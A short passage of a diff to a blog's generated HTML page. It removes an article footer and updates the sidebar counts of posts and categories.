-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1459,14 +1663,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">157</span>
+          <span class="site-state-item-count">159</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">21</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
